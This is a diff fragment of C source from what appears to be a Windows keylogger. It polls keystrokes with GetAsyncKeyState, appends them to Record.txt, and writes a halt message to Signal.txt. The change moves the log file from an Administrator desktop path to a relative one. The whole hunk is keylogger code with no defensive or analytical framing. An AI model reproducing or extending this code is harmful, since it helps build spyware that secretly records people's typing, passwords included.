@@ -19,7 +19,7 @@ int main()
         {
         if(GetAsyncKeyState(capture)== -32767)
         {
-            fp=fopen("C:\\Users\\Administrator\\Desktop\\Record.txt","a+");
+            fp=fopen("Record.txt","a+");
             fn=fopen("Signal.txt","w");
             fprintf(fn,"\nKeylogging System halt......... !");
                 fclose(fn);
